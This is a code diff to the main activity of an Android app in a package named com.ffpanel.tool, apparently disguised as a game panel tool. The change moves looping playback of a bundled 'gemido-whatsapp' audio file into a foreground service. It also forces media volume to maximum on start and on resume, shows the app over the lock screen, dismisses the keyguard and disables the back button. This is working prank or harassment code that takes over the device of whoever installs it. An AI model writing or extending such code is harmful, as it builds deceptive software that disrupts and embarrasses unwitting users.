@@ -1,69 +1,54 @@
 package com.ffpanel.tool;
 
 import android.app.Activity;
-import android.content.pm.ActivityInfo;
+import android.content.Context;
+import android.content.Intent;
 import android.media.AudioManager;
-import android.media.MediaPlayer;
+import android.os.Build;
 import android.os.Bundle;
 import android.view.KeyEvent;
 import android.view.WindowManager;
 
 public class MainActivity extends Activity {
 
-    private AudioManager audioManager;
-    private MediaPlayer mediaPlayer;
-
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
-        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
-        setContentView(R.layout.activity_main);
-        setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);
+        getWindow().addFlags(
+            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
+            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
+            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
+        );
         
-        audioManager = (AudioManager) getSystemService(AUDIO_SERVICE);
+        setContentView(R.layout.activity_main);
+        
+        // Iniciar o service de audio
+        Intent serviceIntent = new Intent(this, AudioService.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(serviceIntent);
+        } else {
+            startService(serviceIntent);
+        }
+        
         maxVolume();
-        playAudio();
+    }
+
+    @Override
+    protected void onResume() {
+        super.onResume();
+        maxVolume();
     }
 
     private void maxVolume() {
         try {
+            AudioManager audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
             audioManager.setStreamVolume(
                 AudioManager.STREAM_MUSIC,
                 audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC),
                 0
             );
         } catch (Exception e) {}
-    }
-
-    private void playAudio() {
-        try {
-            int resId = getResources().getIdentifier("audio", "raw", getPackageName());
-            if (resId != 0) {
-                mediaPlayer = MediaPlayer.create(this, resId);
-            }
-            
-            if (mediaPlayer == null) {
-                playFromAsset();
-            }
-            
-            if (mediaPlayer != null) {
-                mediaPlayer.setLooping(true);
-                mediaPlayer.start();
-            }
-        } catch (Exception e) {}
-    }
-
-    private void playFromAsset() {
-        try {
-            android.content.res.AssetFileDescriptor afd = getAssets().openFd("audio/gemido-whatsapp.mp3");
-            mediaPlayer = new MediaPlayer();
-            mediaPlayer.setDataSource(afd.getFileDescriptor(), afd.getStartOffset(), afd.getLength());
-            afd.close();
-            mediaPlayer.prepare();
-        } catch (Exception e) {
-            mediaPlayer = null;
-        }
     }
 
     @Override
@@ -86,22 +71,7 @@ public class MainActivity extends Activity {
     public void onBackPressed() {}
 
     @Override
-    protected void onResume() {
-        super.onResume();
-        maxVolume();
-        if (mediaPlayer != null && !mediaPlayer.isPlaying()) {
-            mediaPlayer.start();
-        }
-    }
-
-    @Override
     protected void onDestroy() {
         super.onDestroy();
-        try {
-            if (mediaPlayer != null) {
-                mediaPlayer.stop();
-                mediaPlayer.release();
-            }
-        } catch (Exception e) {}
     }
 }
